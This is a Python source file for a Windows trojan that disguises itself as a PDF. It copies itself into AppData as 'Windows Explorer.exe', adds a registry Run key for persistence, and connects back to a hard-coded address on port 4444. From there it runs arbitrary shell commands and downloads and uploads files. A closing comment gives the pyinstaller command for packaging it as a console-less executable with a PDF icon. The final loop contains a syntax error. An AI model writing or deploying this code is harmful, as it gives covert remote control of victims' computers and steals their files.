#!usr/bin/env python
#!usr/bin/env python
import socket
import time
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.auto_start()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def auto_start(self):
        file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable, file_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_loc + '"', shell=True)

    def json_recieve(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ConnectionResetError:
                continue
            except ValueError:
                continue

    def exc(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()

    def change_dir(self, path):
        os.chdir(path)
        return ""

    def write_files(self, path, content):
        if not content:
            return "[-] File don't exist"
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            file.close()
            return "[+] Upload Successful"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                content = base64.b64encode(file.read())
                return content.decode()
        except IOError:
            return "0"

    def run(self):
        '''com = self.json_recieve()
        com = com.split("\n\n")
        if com[1]:
            uph = self.write_files(com[0], com[1])
            required_value = subprocess.check_output("python " + com[0], shell=True).decode()
            required_value = base64.b64encode(required_value.encode())
            self.json_send(required_value.decode())
            os.remove(com[0])'''

        while True:
            try:
                command = self.json_recieve()
                if command == "pwd":
                    command_result = os.getcwd()
                elif command == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0:3] == "cd " and len(command) > 3:
                    command_result = self.change_dir(command[3:])
                elif command[0:8] == "download":
                    command_result = self.read_file(command[9:])
                elif command[0:6] == "upload":
                    command = command.split("\n\n")
                    command_result = self.write_files(command[0][7:], command[1])
                else:
                    command_result = self.exc(command)
                self.json_send(command_result)
            except KeyboardInterrupt:
                self.connection.close()
            except subprocess.CalledProcessError:
                self.json_send("[-] Invalid Command")
            except FileNotFoundError:
                self.json_send("[-] Directory Not Found")


file_name = sys._MEIPASS + "\how_to_hack.pdf"
subprocess.Popen(file_name, shell=True)
'''using pyinstaller run command by pyinstaller
	pyinstaller --add-data "/root/Download/how_to_hack.pdf;." --onefile --noconsole --icon=pdf.ico trojan1.py
   It will create and exe with pdf icon
  '''
while:
	try:
	    my_backdoor = Backdoor("192.168.43.142", 4444)
	    my_backdoor.run()
	except Exception:
	    time.sleep(60)